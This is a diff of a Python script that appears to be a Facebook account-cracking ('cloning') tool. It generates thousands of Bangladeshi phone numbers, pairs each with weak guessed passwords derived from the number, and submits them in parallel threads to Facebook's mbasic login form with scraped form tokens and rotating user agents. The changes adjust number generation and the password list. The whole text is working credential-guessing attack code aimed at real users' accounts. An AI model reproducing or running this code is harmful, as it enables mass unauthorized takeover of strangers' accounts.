@@ -450,18 +450,18 @@ def ran():
     else:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD Number")
         print(sort.line())
-        print("[b]     [red1]✗ [chartreuse1]Type A BD 4 Digit sim code  [orange3]▶  [chartreuse1]0171, 0185, 0192")
+        print("[b]     [red1]✗ [chartreuse1]Type A BD 11 Digit Number  [orange3]▶  [chartreuse1]01710185019")
         code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
         print("[b]     [red1]✗ [chartreuse1]How Many Do You Want To Clone EX   [orange3]▶  [chartreuse1]100000, 200000")
         limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
-        for i in range(limit):
-            data = str(random.choice(range(1000000, 9999999)))
-            user.append(data)
         # for i in range(limit):
-        #     data = str(int(code) + i)
+        #     data = str(random.choice(range(1000000, 9999999)))
         #     user.append(data)
+        for i in range(limit):
+            data = str(int(code) + i)
+            user.append(data)
     print(" Method 1(Best)")
     print(" Method 2")
     print(" Method 3")
@@ -483,7 +483,7 @@ def ran():
     else:
         fb = "mbasic"
 
-    with ThreadPool(max_workers=70) as heron:
+    with ThreadPool(max_workers=50) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
@@ -493,11 +493,11 @@ def ran():
             if ask in ["1", "01", "a", "A"]:
                 uid = "91" + xd
             else:
-                uid = code + xd
+                uid = "0" + xd
             if ask in ["1", "01", "a", "A"]:
                 pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[2:]]
             else:
-                pwx = [uid, uid[:6], uid[:8], xd[1:], uid[3:], "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
+                pwx = [uid, uid[:6], uid[:8], xd[4], xd[2:]]#, "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
@@ -517,7 +517,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = Samsung()
+            uax = ua()
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
             lsd = lsb()
